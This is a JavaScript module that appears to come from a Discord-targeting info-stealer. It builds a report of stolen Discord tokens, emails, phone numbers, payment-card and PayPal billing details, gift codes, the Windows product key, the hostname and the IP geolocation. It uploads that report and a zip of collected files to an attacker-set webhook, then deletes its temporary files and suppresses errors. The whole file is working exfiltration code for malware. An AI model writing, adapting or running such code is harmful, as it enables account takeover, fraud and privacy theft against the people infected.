const { webhook } = require('../config');
const { isValidURL } = require('../util/string');
const axios = require('axios');
const { join, sep } = require('path');
const os = require('os');
const { filesize } = require('filesize');
const fs = require('fs');
const { tempFolder } = require('../index');
const FormData = require('form-data');
const { rmSync, readFileSync } = require('fs');
const moment = require('moment');
const { userAgent } = require('../config');

if (!webhook.url || typeof webhook.url !== 'string' || !isValidURL(webhook.url)) return;

const json = async (zipFile) => {
  const ipInfo = async (info) => await require('./ip-info').then(ip => ip[info]);
  const discordAccountInfo = JSON.parse(readFileSync(join(tempFolder, 'dsc_acc.json')).toString());
  const computerInfoFields = [
    ['RAM', filesize(Math.round(os.totalmem()))],
    ['Name', os.hostname()],
    ['Uptime', `<t:${Math.floor(Math.round(Date.now() / 1000) - os.uptime())}:R> (<t:${Math.floor(Math.round(Date.now() / 1000) - os.uptime())}:f>)`],
    ['Username', os.userInfo().username],
    ['OS version', os.version()],
    ['Product Key', `\`\`${require('./product-key').productKey}\`\``],
    ['Backup Product Key', `\`\`${require('./product-key').backupProductKey}\`\``],
  ];
  const ipInfoFields = [
    ['IP Address', `[${await ipInfo('query')}](<https://whatismyipaddress.com/ip/${await ipInfo('query')}>)`],
    ['Location', `[${await ipInfo('lat')}, ${await ipInfo('lon')}](<https://www.google.com/maps/search/?api=1&query=${await ipInfo('lat')}%2C${await ipInfo('lon')}>)`],
    ['ISP', await ipInfo('isp')],
  ];

  const embeds = [
    {
      title: 'Computer Info',
      fields: computerInfoFields.map(f => { return { name: f[0], value: f[1], inline: true }; })
    },
    {
      title: 'IP Info',
      fields: ipInfoFields.map(f => { return { name: f[0], value: f[1], inline: true }; })
    }
  ];
  discordAccountInfo.accounts.forEach(account => { embeds.push({
    description: `Token: \`\`\`\n${account.token}\n\`\`\``,
    author: {
      name: `${account.username}#${account.discriminator}`,
      icon_url: `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.${account.avatar.startsWith('a_') ? 'gif' : 'png'}`
    },
    fields: [
      ['ID', account.id],
      ['Bio', account.bio],
      ['Locale', account.locale],
      ['NSFW Allowed', account.nsfw_allowed],
      ['MFA Enabled', account.mfa_enabled],
      ['Email', account.email || 'No Email'],
      ['Email Verified', account.verified],
      ['Phone Number', account.phone || 'No Phone Number'],
      ['Nitro Subscription', (() => { switch (account.premium_type) {
        case 0:
          return 'No Nitro';
        case 1:
          return 'Nitro Classic';
        case 2:
          return 'Nitro';
        case 3:
          return 'Nitro Basic';
        default:
          return 'No Nitro Subscription';
      } })()],
      /*['Flags', (() => { let flags = []; switch (account.flags) {
        case 1 << 0:
          flags.push('Staff'); break;
        case 1 << 1:
          flags.push('Partner'); break;
        case 1 << 2:
          flags.push('HypeSquad'); break;
        case 1 << 3:
          flags.push('Bug Hunter (Level 1)'); break;
        case 1 << 6:
          flags.push('HypeSquad (House 1)'); break;
        case 1 << 7:
          flags.push('HypeSquad (House 2)'); break;
        case 1 << 8:
          flags.push('HypeSquad (House 3)'); break;
        case 1 << 9:
          flags.push('Early Supporter'); break;
        case 1 << 10:
          flags.push('Team User'); break;
        case 1 << 14:
          flags.push('Bug Hunter (Level 2)'); break;
        case 1 << 16:
          flags.push('Verified Bot'); break;
        case 1 << 17:
          flags.push('Verified Developer'); break;
        case 1 << 18:
          flags.push('Certified Moderator'); break;
        case 1 << 19:
          flags.push('Bot HTTP Interactions'); break;
        case 1 << 22:
          flags.push('Active Developer'); break;
        default:
          return 'No Flags';
      } return flags.join(', '); })()],*/
    ].map(f => { return { name: f[0], value: f[1], inline: true }; }),
    color: account.accent_color,
  }); });
  discordAccountInfo.billing.length >= 1 ? discordAccountInfo.billing.forEach(billing => { embeds.push({
    title: `Discord Account - Billing - ${(() => { switch (billing.type) {
      case 1:
        return 'Credit Card';
      case 2:
        return 'PayPal';
      default:
        return 'Unknown';
    } })()}`,
    fields: (billing.type === 1 ? [
      ['ID', billing.id],
      ['Default', billing.default],
      ['Name', billing.billing_address.name],
      ['Country', `${billing.country} :flag_${billing.country.toLowerCase()}:`],
      ['Ends in', billing.last_4],
      ['Brand', billing.brand],
      ['Expires in', billing.expires_month + '/' + billing.expires_year]
    ] : [
      ['ID', billing.id],
      ['Default', billing.default],
      ['Name', billing.billing_address.name],
      ['Email', billing.email],
      ['Country', `${billing.country} :flag_${billing.country.toLowerCase()}:`],
    ]).map(f => { return { name: f[0], value: f[1], inline: true }; })
  }); }) : embeds.push({
    title: 'Discord Account - Billing', description: 'No Billing'
  });
  discordAccountInfo.gifts.forEach(gift => { embeds.push({
    title: `Discord Account - Promotion - ${gift.promotion.outbound_title}`,
    description: gift.promotion.outbound_redemption_modal_body,
    fields: [
      ['ID', gift.promotion.id],
      ['Start Date', `<t:${Math.floor(moment(gift.promotion.start_date).utc().valueOf() / 1000)}:f>`],
      ['End Date', `<t:${Math.floor(moment(gift.promotion.end_date).utc().valueOf() / 1000)}:f>`],
      ['Claimed At', `<t:${Math.floor(moment(gift.claimed_at).utc().valueOf() / 1000)}:f>`],
      ['Code', `\`\`${gift.code}\`\` ([Redeem](${gift.promotion.outbound_redemption_page_link}))`],
      ['User ID', gift.user_id]
    ].map(f => { return { name: f[0], value: f[1], inline: true }; })
  }); });

  return {
    content: webhook.content, embeds, allowed_mentions: { parse: ['everyone'], },
    attachments: [
      {
        id: 0,
        filename: zipFile?.split(sep)?.pop(),
        description: 'A zip archive containing all the files.',
        content_type: 'application/zip',
        url: `attachment://${zipFile?.split(sep)?.pop()}`,
      }
    ]
  };
};

module.exports = async (zipFile) => {
  const data = new FormData();
  data.append('files[0]', fs.createReadStream(zipFile));
  data.append('payload_json', JSON.stringify(await json(zipFile)));

  axios.post(webhook.url, data, {
    headers: { 'Content-Type': 'multipart/form-data', 'User-Agent': userAgent },
  })
    .then(() => {
      // Zip sent to Discord webhook, now we can delete all the files
      rmSync(tempFolder, { recursive: true });
    })
    .catch(() => {});
};
